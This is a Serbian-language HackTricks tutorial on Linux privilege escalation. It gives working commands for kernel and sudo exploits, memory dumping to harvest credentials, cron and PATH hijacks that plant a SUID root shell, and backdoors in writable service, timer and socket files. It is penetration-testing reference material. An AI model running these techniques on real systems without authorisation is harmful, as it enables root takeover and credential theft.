# Linux Privilege Escalation

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Informacije o sistemu

### Informacije o OS-u

Hajde da počnemo sa sticanjem nekog znanja o OS-u koji se izvršava.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Putanja

Ako **imate dozvole za pisanje u bilo kojem folderu unutar promenljive `PATH`**, možda ćete moći da preuzmete kontrolu nad nekim bibliotekama ili binarnim fajlovima:

```bash
echo $PATH
```

### Informacije o okruženju

Da li postoje zanimljive informacije, lozinke ili API ključevi u okruženjskim varijablama?

```bash
(env || set) 2>/dev/null
```

### Eksploatacija kernela

Proverite verziju kernela i da li postoji neki eksploit koji se može koristiti za eskalaciju privilegija.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Možete pronaći dobar popis ranjivih kernela i već **kompajlirane eksploate** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Drugi sajtovi gde možete pronaći neke **kompajlirane eksploate**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive verzije kernela sa te veb stranice, možete uraditi:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Alati koji mogu pomoći u pretrazi za eksploate kernela su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvrši NA žrtvi, samo proverava eksploate za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**, možda je vaša verzija kernela navedena u nekom kernel eksploit-u i tada ćete biti sigurni da je taj eksploit validan.

### CVE-2016-5195 (DirtyCow)

Eskalacija privilegija u Linuxu - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Verzija Sudo-a

Na osnovu ranjivih verzija sudo-a koje se pojavljuju u:

```bash
searchsploit sudo
```

Možete proveriti da li je verzija sudo programa ranjiva koristeći ovu komandu grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

#### sudo < v1.28

Od @sickrov

***

Sudo verzija manja od 1.28

```
sudo -u#-1 /bin/bash
```

### Dmesg verifikacija potpisa nije uspela

Proverite **smasher2 kutiju na HTB-u** za **primer** kako bi ova ranjivost mogla biti iskorišćena

```bash
dmesg 2>/dev/null | grep "signature"
```

### Dodatna enumeracija sistema

Ovde su neki dodatni koraci koje možete preduzeti kako biste dalje istražili sistem:

* **Proverite verziju jezgra**: Pokrenite komandu `uname -a` kako biste saznali verziju jezgra sistema.
* **Pregledajte instalirane pakete**: Upotrebite odgovarajuću komandu za upravljanje paketima (npr. `dpkg -l` za Debian bazirane sisteme ili `rpm -qa` za Red Hat bazirane sisteme) kako biste dobili listu instaliranih paketa na sistemu.
* **Proverite otvorene portove**: Izvršite komandu `netstat -tuln` kako biste videli koji su portovi otvoreni na sistemu.
* **Pregledajte log fajlove**: Pregledajte log fajlove sistema kako biste pronašli potencijalne tragove ili informacije o ranjivostima. Koristite komandu `tail -f /var/log/syslog` za praćenje syslog fajla u realnom vremenu.
* **Proverite privilegije korisnika**: Izvršite komandu `id` kako biste videli privilegije trenutnog korisnika. Takođe možete proveriti fajl `/etc/passwd` kako biste videli sve korisnike na sistemu i njihove privilegije.
* **Pregledajte konfiguracione fajlove**: Pregledajte konfiguracione fajlove sistema kako biste pronašli potencijalne slabosti ili informacije koje mogu biti iskorišćene za eskalaciju privilegija. Koristite komandu `cat` ili `less` za pregled fajlova.
* **Proverite postavke servisa**: Pregledajte konfiguraciju servisa koji se izvršavaju na sistemu kako biste pronašli potencijalne slabosti ili informacije koje mogu biti iskorišćene za eskalaciju privilegija. Proverite fajlove u direktorijumu `/etc` koji se odnose na servise koje želite da istražite.
* **Pregledajte skrivene fajlove i direktorijume**: Upotrebite komandu `ls -la` kako biste videli skrivene fajlove i direktorijume na sistemu.

Nastavite sa ovim koracima kako biste dobili što više informacija o sistemu i potencijalnim ranjivostima koje možete iskoristiti za eskalaciju privilegija.

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

### Enumeriraj moguće odbrane

### AppArmor

AppArmor je sigurnosni mehanizam za Linux koji omogućava kontrolu pristupa resursima sistema na osnovu definisanih pravila. Ova odbrana može ograničiti privilegije procesa i sprečiti neovlašćen pristup sistemskim resursima. Da biste proverili da li je AppArmor aktiviran na ciljnom sistemu, možete koristiti sledeću komandu:

```bash
sudo apparmor_status
```

Ako je AppArmor aktivan, trebali biste proveriti da li postoje pravila koja mogu biti iskorišćena za eskalaciju privilegija. Pravila AppArmor-a se obično nalaze u direktorijumu `/etc/apparmor.d/`. Pregledajte ova pravila kako biste identifikovali eventualne slabosti ili propuste u konfiguraciji.

```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```

### Grsecurity

Grsecurity je sigurnosni dodatak za Linux jezgro koji pruža dodatne funkcionalnosti za zaštitu sistema od različitih napada. Ovaj dodatak se fokusira na sprečavanje eskalacije privilegija, izvršavanje koda i drugih sigurnosnih ranjivosti.

Grsecurity implementira različite sigurnosne mehanizme kao što su:

* **RBAC (Role-Based Access Control)**: Ovaj mehanizam omogućava precizno definisanje prava pristupa za korisnike i procese na sistemu. Može se koristiti za ograničavanje privilegija korisnika i sprečavanje neovlašćenog pristupa resursima.
* **ASLR (Address Space Layout Randomization)**: Ova tehnika služi za otežavanje napadačima pronalaženje tačnih adresa u memoriji sistema. Ona slučajno raspoređuje adrese kako bi otežala iskorišćavanje ranjivosti.
* **PaX**: PaX je set sigurnosnih funkcionalnosti koji se koristi za sprečavanje izvršavanja koda na memorijskim regionima koji nisu namenjeni za to. Ovo pomaže u zaštiti sistema od napada koji koriste buffer overflow i slične ranjivosti.

Grsecurity takođe pruža dodatne funkcionalnosti kao što su zaštita od napada preko mreže, detekcija i sprečavanje napada na memoriju, kao i zaštita od napada na kernel.

Važno je napomenuti da Grsecurity nije deo standardne Linux distribucije i zahteva posebnu instalaciju i konfiguraciju. Takođe, korišćenje Grsecurity-a zahteva napredno razumevanje Linux sistema i sigurnosnih mehanizama.

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

PaX je set sigurnosnih funkcija za Linux jezgro koje se koriste za otežavanje izvršavanja zlonamernog koda. Ove funkcije uključuju ASLR (Adress Space Layout Randomization), koja slučajno raspoređuje adrese memorije kako bi otežala pronalaženje ranjivosti, i NX (No eXecute), koja sprečava izvršavanje koda na memorijskim regionima označenim kao samo za čitanje.

Da biste proverili da li je PaX omogućen na sistemu, možete koristiti komandu `paxctl`. Ova komanda prikazuje status PaX-a za sve izvršne fajlove na sistemu.

```bash
paxctl -v /putanja/do/fajla
```

Da biste onemogućili PaX za određeni izvršni fajl, možete koristiti sledeću komandu:

```bash
paxctl -c /putanja/do/fajla
```

Ova komanda će ukloniti sve PaX sigurnosne funkcije za dati fajl.

Važno je napomenuti da je PaX samo jedan od mnogih alata koji se mogu koristiti za otežavanje izvršavanja zlonamernog koda. U kombinaciji sa drugim sigurnosnim merama, kao što su ažuriranje softvera i konfiguracija pravilnih dozvola, PaX može biti koristan alat za jačanje sigurnosti Linux sistema.

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

Execshield je tehnika zaštite koja je implementirana u Linux kernelu kako bi se smanjio rizik od izvršavanja zlonamjernog koda. Ova tehnika koristi nekoliko mehanizama zaštite, uključujući ASLR (Address Space Layout Randomization) i NX (No-Execute) bit.

ASLR služi za nasumično raspoređivanje adresa u memoriji, čime se otežava predviđanje lokacija funkcija i podataka. Ovo otežava napadačima da iskoriste ranjivosti u programima.

NX bit onemogućava izvršavanje koda na memorijskim stranicama koje su označene kao samo za čitanje. Ovo sprječava izvršavanje zlonamjernog koda koji je ubačen u memoriju.

Execshield je koristan alat za otežavanje eskalacije privilegija, jer otežava napadačima da izvrše zlonamjerni kod s povišenim privilegijama. Međutim, važno je napomenuti da Execshield nije neprobojan i da se i dalje mogu pronaći ranjivosti koje omogućavaju eskalaciju privilegija. Stoga je važno redovito ažurirati sustav i primjenjivati ​​druge sigurnosne mjere kako bi se smanjio rizik od napada.

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

SElinux (Security-Enhanced Linux) je mehanizam za kontrolu pristupa koji je ugrađen u jezgro Linux operativnog sistema. On pruža dodatni sloj sigurnosti tako što ograničava privilegije procesa i resursa na sistemu. SElinux koristi politike bezbednosti koje definišu dozvoljene akcije za svaki subjekat (korisnik, proces, fajl itd.) na sistemu.

SElinux može biti koristan za otežavanje eskalacije privilegija. Kada je uključen, on može sprečiti procese sa nižim privilegijama da pristupe resursima koji su rezervisani za procese sa višim privilegijama. Takođe, SElinux može ograničiti mogućnosti izvršavanja određenih akcija, kao što je pokretanje određenih programa ili pristupanje određenim fajlovima.

Da biste iskoristili SElinux za eskalaciju privilegija, treba da tražite slabosti u politikama bezbednosti ili da pronađete način da zaobiđete ograničenja koja su postavljena od strane SElinux-a.

```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```

ASLR (Address Space Layout Randomization) je sigurnosna tehnika koja služi za otežavanje napadačima da iskoriste ranjivosti u softveru. Ova tehnika slučajno raspoređuje adrese memorije na kojima se nalaze izvršni kod, biblioteke i podaci, čime otežava predviđanje tačnih adresa napadačima. Ovo smanjuje uspešnost napada na ranjivosti kao što su prelivanje bafera (buffer overflow) i ubrizgavanje koda (code injection). ASLR je važan deo hardeninga sistema i trebao bi biti omogućen na svim sistemima gde je to moguće.

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Docker izlazak

Ako se nalazite unutar Docker kontejnera, možete pokušati da iz njega izađete:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Diskovi

Proverite **šta je montirano i odmontirano**, gde i zašto. Ako je nešto odmontirano, možete pokušati da ga montirate i proverite da li ima privatnih informacija.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Korisni softver

Nabrajajte korisne binarne datoteke

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Takođe, proverite da li je **instaliran bilo koji kompajler**. Ovo je korisno ako trebate koristiti neki kernel eksploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na sličnoj).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Instalirani ranjivi softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji stara verzija Nagios-a (na primer) koja bi mogla biti iskorišćena za eskalaciju privilegija...\
Preporučuje se ručna provera verzije sumnjivijeg instaliranog softvera.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Ako imate SSH pristup mašini, takođe možete koristiti **openVAS** da proverite da li su instalirani zastareli i ranjivi softveri unutar mašine.

{% hint style="info" %}
Napomena da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, stoga se preporučuje korišćenje nekih aplikacija poput OpenVAS-a ili sličnih koje će proveriti da li je bilo koja instalirana verzija softvera ranjiva na poznate eksploate.
{% endhint %}

## Procesi

Pogledajte **koji se procesi** izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda se tomcat izvršava kao root?).

```bash
ps aux
ps -ef
top -n 1
```

Uvek proverite da li su pokrenuti mogući **electron/cef/chromium debugeri**, možete ih zloupotrebiti za eskalaciju privilegija. **Linpeas** otkriva ove debugere proverom parametra `--inspect` u komandnoj liniji procesa.\
Takođe **proverite privilegije nad izvršnim datotekama procesa**, možda možete prepisati nečije.

### Praćenje procesa

Možete koristiti alate poput [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikaciju ranjivih procesa koji se često izvršavaju ili kada se ispune određeni zahtevi.

### Memorija procesa

Neke usluge servera čuvaju **kredencijale u čistom tekstu unutar memorije**.\
Obično će vam biti potrebne **root privilegije** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, stoga je ovo obično korisnije kada već imate root privilegije i želite otkriti više kredencijala.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

{% hint style="warning" %}
Imajte na umu da danas većina mašina **ne dozvoljava ptrace podrazumevano**, što znači da ne možete izvršiti dump drugih procesa koji pripadaju vašem neprivilegovanom korisniku.

Datoteka _**/proc/sys/kernel/yama/ptrace\_scope**_ kontroliše dostupnost ptrace:

* **kernel.yama.ptrace\_scope = 0**: svi procesi mogu biti debugovani, pod uslovom da imaju isti uid. Ovo je klasičan način na koji je ptracing funkcionisao.
* **kernel.yama.ptrace\_scope = 1**: samo roditeljski proces može biti debugovan.
* **kernel.yama.ptrace\_scope = 2**: Samo administrator može koristiti ptrace, jer zahteva CAP\_SYS\_PTRACE sposobnost.
* **kernel.yama.ptrace\_scope = 3**: Nijedan proces ne sme biti praćen ptrace-om. Nakon podešavanja, potrebno je ponovno pokretanje da bi se omogućilo ptracing.
{% endhint %}

#### GDB

Ako imate pristup memoriji FTP servisa (na primer), možete dobiti Heap i pretraživati njegove kredencijale.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB skripta

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuje kako je memorija mapirana unutar virtualnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane regije**. Pseudo fajl **mem otkriva samu memoriju procesa**. Iz fajla **maps znamo koje su memorijske regije čitljive** i njihove ofsete. Koristimo ove informacije da **tražimo u mem fajlu i izbacimo sve čitljive regije** u fajl.

```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` pruža pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni prostor adresa kernela može se pristupiti koristeći /dev/kmem.\
Tipično, `/dev/mem` je samo čitljiv od strane **root** korisnika i **kmem** grupe.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump za Linux

ProcDump je Linux verzija klasičnog alata ProcDump iz kolekcije alata Sysinternals za Windows. Preuzmite ga sa [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Alati

Da biste izbacili memoriju procesa, možete koristiti:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahtev za root i izbaciti proces koji vam pripada
* Skripta A.5 sa [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako primetite da je proces autentifikatora pokrenut:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Možete izvršiti ispisivanje procesa (vidite prethodne sekcije kako biste pronašli različite načine za ispisivanje memorije procesa) i pretražiti memoriju u potrazi za akreditacijama:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Alatka [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti jasne tekstualne kredencijale iz memorije** i iz nekih **poznatih datoteka**. Za pravilan rad zahteva privilegije root korisnika.

| Funkcija                                          | Ime procesa          |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (Aktivne HTTP Basic Auth sesije)          | apache2              |
| OpenSSH (Aktivne SSH sesije - Sudo upotreba)      | sshd:                |

#### Pretraga Regexa/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Planirani/Cron poslovi

Proverite da li je neki planirani posao ranjiv. Možda možete iskoristiti skriptu koju izvršava root (ranjivost sa džokerom? možete li menjati fajlove koje root koristi? koristiti simboličke veze? kreirati specifične fajlove u direktorijumu koji root koristi?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

### Putanja za Cron

Na primer, unutar _/etc/crontab_ datoteke možete pronaći putanju: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Primetite kako korisnik "user" ima privilegije pisanja nad /home/user_)

Ako unutar ove crontab datoteke korisnik root pokuša da izvrši neku komandu ili skriptu bez postavljanja putanje. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron koristeći skriptu sa džokerom (Wildcard Injection)

Ako se skripta izvršava kao root i ima "**\***" unutar komande, možete iskoristiti ovo da biste izvršili neočekivane radnje (poput eskalacije privilegija). Primer:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Ako je zamena za sve karaktere prethodjena putanjom kao** _**/neka/putanja/\***_ **, nije ranjiva (čak ni** _**./\***_ **).**

Pročitajte sledeću stranicu za više trikova eksploatacije zamene za sve karaktere:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Prepisivanje skripte Cron-a i simboličke veze

Ako **možete izmeniti skriptu Cron-a** koju izvršava root, možete vrlo lako dobiti shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Ako skripta koju izvršava root koristi **direktorijum u kojem imate potpuni pristup**, možda bi bilo korisno da obrišete taj folder i **napravite simbolički link ka drugom folderu** u kojem se nalazi skripta kojom vi upravljate.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Česti cron poslovi

Možete pratiti procese kako biste pronašli one koji se izvršavaju svake 1, 2 ili 5 minuta. Možda možete iskoristiti to i povećati privilegije.

Na primjer, da biste **pratili svakih 0.1s tokom 1 minute**, **sortirali po manje izvršenim naredbama** i izbrisali naredbe koje su najviše izvršene, možete uraditi:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Možete takođe koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će pratiti i listati svaki proces koji se pokrene).

### Nevidljivi cron poslovi

Moguće je kreirati cron posao **stavljanjem povratnog znaka nakon komentara** (bez znaka za novi red), i cron posao će raditi. Primer (obratite pažnju na povratni znak):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

## Servisi

### Pisivi _.service_ fajlovi

Proverite da li možete da pišete bilo koji `.service` fajl, ako možete, **možete ga izmeniti** tako da **izvršava** vašu **bekdor** kada se servis **pokrene**, **ponovo pokrene** ili **zaustavi** (možda ćete morati da sačekate da se mašina ponovo pokrene).\
Na primer, kreirajte svoj bekdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Pisivi servisni binarni fajlovi

Imajte na umu da ako imate **dozvole za pisanje nad binarnim fajlovima koji se izvršavaju od strane servisa**, možete ih promeniti u bekdoorove tako da kada se servisi ponovo izvrše, bekdoorovi će biti izvršeni.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** sa:

```bash
systemctl show-environment
```

Ako primetite da možete **pisati** u bilo kojem od foldera na putanji, možda ćete moći **povećati privilegije**. Trebate pretražiti datoteke konfiguracije usluga u kojima se koriste **relativne putanje**, kao što su:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Zatim, kreirajte **izvršnu datoteku** sa **istim imenom kao relativna putanja binarne datoteke** unutar systemd PATH foldera u kojem možete pisati, i kada se servis zatraži da izvrši ranjivu radnju (**Start**, **Stop**, **Reload**), vaša **stražnja vrata će biti izvršena** (obično neprivilegovani korisnici ne mogu pokretati/zaustavljati servise, ali proverite da li možete koristiti `sudo -l`).

**Saznajte više o servisima sa `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd unit datoteke čije ime se završava na `**.timer**` koje kontrolišu `**.service**` datoteke ili događaje. **Tajmeri** se mogu koristiti kao alternativa za cron, jer imaju ugrađenu podršku za kalendarne događaje i monotone događaje i mogu se pokretati asinhrono.

Možete nabrojati sve tajmere sa:

```bash
systemctl list-timers --all
```

### Pisanje u timerima

Ako možete izmeniti timer, možete ga naterati da izvrši neke postojeće systemd.unit (poput `.service` ili `.target`)

```bash
Unit=backdoor.service
```

U dokumentaciji možete pročitati šta je Unit:

> Jedinička vrednost koja se aktivira kada ovaj tajmer istekne. Argument je ime jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost se podrazumeva kao servis koji ima isto ime kao jedinica tajmera, osim sufiksa. (Vidi gore.) Preporučuje se da ime aktivirane jedinice i ime jedinice tajmera budu identična, osim sufiksa.

Da biste iskoristili ovu dozvolu, trebali biste:

* Pronaći neku systemd jedinicu (poput `.service`) koja **izvršava upisivu binarnu datoteku**
* Pronaći neku systemd jedinicu koja **izvršava relativnu putanju** i imate **dozvole za pisanje** nad **systemd putanjom** (da biste se predstavili kao ta izvršna datoteka)

**Saznajte više o tajmerima sa `man systemd.timer`.**

### **Omogućavanje tajmera**

Da biste omogućili tajmer, potrebne su vam privilegije root-a i izvršite:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Napomena da je **tajmer** aktiviran kreiranjem simboličke veze ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **komunikaciju između procesa** na istom ili različitim mašinama unutar klijent-server modela. Koriste standardne Unix deskriptore za međuračunarsku komunikaciju i postavljaju se putem `.socket` fajlova.

Soketi se mogu konfigurisati korišćenjem `.socket` fajlova.

**Saznajte više o soketima sa `man systemd.socket`.** Unutar ovog fajla, mogu se konfigurisati nekoliko interesantnih parametara:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije su različite, ali se koristi sažetak da se **pokaže gde će soket slušati** (putanja AF\_UNIX soket fajla, IPv4/6 i/ili broj porta za slušanje, itd.)
* `Accept`: Prihvata boolean argument. Ako je **true**, za svaku dolaznu konekciju se pokreće **instanca servisa** i samo konekciona soket se prosleđuje. Ako je **false**, svi soketi za slušanje se **prosleđuju pokrenutom servisnom unitu**, i samo jedan servisni unit se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sokete i FIFO-ove gde jedan servisni unit bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevana vrednost je false**. Iz performansnih razloga, preporučuje se pisanje novih demona samo na način koji je pogodan za `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Prihvata jednu ili više komandnih linija, koje se **izvršavaju pre** ili **posle** kreiranja i vezivanja **soketa**/FIFO-ova za slušanje, redom. Prvi token komandne linije mora biti apsolutno ime fajla, a zatim slede argumenti za proces.
* `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** zatvaranja i uklanjanja **soketa**/FIFO-ova za slušanje, redom.
* `Service`: Određuje ime **servisnog** unita **za aktiviranje** na **dolaznom saobraćaju**. Ovo podešavanje je dozvoljeno samo za sokete sa Accept=no. Podrazumevana vrednost je servis koji nosi isto ime kao soket (sa zamenjenim sufiksom). U većini slučajeva, ne bi trebalo biti potrebno koristiti ovu opciju.

### Writable .socket fajlovi

Ako pronađete **upisiv fajl** `.socket`, možete **dodati** na početak odeljka `[Socket]` nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se soket kreira. Stoga, **verovatno ćete morati da sačekate da se mašina ponovo pokrene.**\
Napomena da sistem mora koristiti tu konfiguraciju soket fajla ili backdoor neće biti izvršen.

### Writable soketi

